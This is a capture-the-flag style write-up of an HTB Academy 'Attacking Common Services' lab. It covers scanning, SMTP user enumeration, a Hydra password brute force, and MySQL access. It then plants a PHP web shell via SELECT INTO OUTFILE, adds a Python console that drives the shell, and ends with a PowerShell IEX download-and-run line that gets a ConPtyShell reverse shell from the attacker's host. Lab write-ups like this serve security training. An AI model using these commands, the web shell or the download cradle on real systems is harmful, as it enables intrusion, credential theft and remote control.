---
title: "HTB Academy | Attacking Common Services lab 1"
description: "This is a easy lab writeup from the htb module attacking common services"
pubDate: "Nov 15 2024"
heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
badge: "Easy"
tags: ["smtp", "bruteforcing", "information-leakage","Windows","MySql","RCE","XAMPP","Revershe Shell"]
---

- 1. Nmap scan:

```sh
sudo nmap -sS -p- --open --min-rate -Pn -n -vvv $target -oG allports
```

- 2. Nmap scripts and services

```sh
nmap -sCV -p $Ports $target -oN targeted
```

```python
# Nmap 7.94SVN scan initiated Tue Nov 12 21:17:33 2024 as: /usr/lib/nmap/nmap --privileged -sCV -p21,25,80,443,587,3306,3389 -oN targeted 10.129.222.77
Nmap scan report for 10.129.222.77
Host is up (1.2s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_ssl-date: 2024-11-13T00:19:24+00:00; 0s from scanner time.
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|   SSLSessionReq: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_    Command unknown, not supported or not allowed...
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.222.77/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https         Core FTP HTTPS Server
|_http-server-header: Core FTP HTTPS Server
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Area
|_ssl-date: 2024-11-13T00:19:20+00:00; -1s from scanner time.
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 11
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, ODBCClient, LongColumnFlag, SupportsTransactions, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: aFxKL}PXICT]W}1v#G|^
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-11-13T00:19:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2024-11-12T00:15:06
|_Not valid after:  2025-05-14T00:15:06
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=11/12%Time=6733F027%P=x86_64-pc-linux-gnu%r(
SF:NULL,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x207
SF:25,\x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20F
SF:TP\x20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregist
SF:ered\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20
SF:allowed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x
SF:20not\x20allowed\.\.\.\r\n")%r(SSLSessionReq,77,"220\x20Core\x20FTP\x20
SF:Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r
SF:\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allowe
SF:d\.\.\.\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 12 21:19:28 2024 -- 1 IP address (1 host up) scanned in 114.64 seconds
```

- 3. Smtp User enumeration:

```sh
❯ smtp-user-enum -M RCPT -U ../../content/users.list -D inlanefreight.htb -t 10.129.153.88
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... ../../content/users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

10.129.153.88: fiona@inlanefreight.htb exists

1 results.

79 queries in 17 seconds (4.6 queries / sec)
```

- 4. Hydra password spraying 

```sh
❯ hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.153.88
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-21 17:14:48
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smtp://10.129.153.88:25/
[25][smtp] host: 10.129.153.88   login: fiona@inlanefreight.htb   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

- 5. Testing credentials on Mysql service:

```sh
❯ mysql -u fiona -p987654321 -h 10.129.153.88 --ssl=0
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 10
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

- 6. So we got into the database but the ports 80 and 443 are serving a xampp service, let's see if we found a path to inject a file in the system

![alt text](/1.png)

- 7. Found the path "C:/xampp/htdocs/dasboard/".

![alt text](/2.png)

- 8. Injecting a php file via mysql in the sistem:

```sql
MariaDB [(none)]> select '<?php echo "this is a test"?>' into outfile 'C:/xampp/htdocs/dashboard/test.php';
Query OK, 1 row affected (0,251 sec)

MariaDB [(none)]> 
```
![alt text](/3.png)

- 9. PHP RCE and getting a reverse shell

```sql
MariaDB [(none)]> select '<?php echo shell_exec($_GET["cmd"]); ?>' into outfile 'C:/xampp/htdocs/dashboard/pawned.php';
Query OK, 1 row affected (0,238 sec)

MariaDB [(none)]> 
```

![alt text](/4.png)

- 10. Python script to execute RCE and getting the shell:

```python
import requests
import argparse
import os
import urllib.parse



ROJO = "\033[31m"
VERDE = "\033[32m"
AZUL = "\033[34m"
RESET = "\033[0m"



def clear():
    os.system('clear')


def send_command(path):
    while True:
        command = urllib.parse.quote(input(f"{ROJO}RCE{RESET} {AZUL}${RESET}{VERDE}>>{RESET} "))

        pwned = f'{path}?cmd={command}'

        try:
            response = requests.get(pwned)

            if response.status_code == 200 and len(response.text)>= 1:
                clear()
                print(response.text)
                
            else:
                print(f"Estatus code error: {response.status_code}, Or there's no output")

        except KeyboardInterrupt:
            print(f"exiting ...")


def main():

    parser = argparse.ArgumentParser(description="RCE Pseudo console")

    parser.add_argument('-p','--path',type=str,required=True,help='Url Path of the file')

    args = parser.parse_args()

    send_command(args.path)


if __name__ == "__main__":
    main()

```
```python
❯ python3 pseudo-rce.py -p http://inlanefreight.htb/dashboard/pawned.php
RCE $>>   
```

- 11 Using ConPtyShell from antoniococo [[https://github.com/antonioCoco/ConPtyShell|Github]]:

```sh
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 
```

- 12 In the script at last line, you can put this code and set the configuration of your machine and listeting port. Rows and columns is the size of your terminal, in my case is 48 and 162, you can use ("stty size") in your terminal to see yours.

```powershell
Invoke-ConPtyShell -RemoteIp <yourIp> -RemotePort 666 -Rows 48 -Cols 162
```


- 13 Preparing the Web server and listening with netcat:

```sh
python3 -m http.server 80
```

```sh
nc -nlvp 1234
```

![alt text](/5.png)

- 14 download the shell from the target machine

```python
RCE $>> powershell -Command "IEX (New-Object Net.WebClient).DownloadString(http://<Ip>/Invoke-ConPtyShell.ps1)"
```

![alt text](/6.png)

- 15 Searching the flag:

![alt text](/7.png)